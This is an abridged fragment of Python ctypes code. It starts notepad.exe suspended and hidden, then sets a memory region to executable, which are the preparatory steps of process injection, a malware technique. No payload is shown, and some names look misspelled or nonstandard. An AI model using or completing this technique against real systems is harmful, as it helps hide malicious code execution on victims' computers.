...
class STARTUPINFO(Structure):
	_fields_ = [('cb', wintypes.DWORD), ('lpReserved', LPTSTR), ('lpDesktop', LPTSTR), ('lpTitle', LPTSTR), ('dwX', wintypes.DWORD), ('dwY', wintypes.DWORD), ('dwXSize', wintypes.DWORD), ('dwYSize', wintypes.DWORD), ('dwXCountChars', wintypes.DWORD), ('dwYCountChars', wintypes.DWORD), ('dwFillAttibute', wintypes.DWORD), ('dwFlags', wintypes.DWORD), ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD), ('lpReserved2', LPBYTE), ('hStdInput', wintypes.HANDLE), ('hStdOutput', wintypes.HANDLE), ('hStdError', wintypes.HANDLE),]
...
created = CreateProcessA(b'C:\\Windows\\System32\\notepad.exe', None, None, None, False, CREATE_SUSPEND | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))
...
verify(protect)
print('Memory protection updated from {} to {}'.format(old_protection, PAGE_EXECUTE_READ))
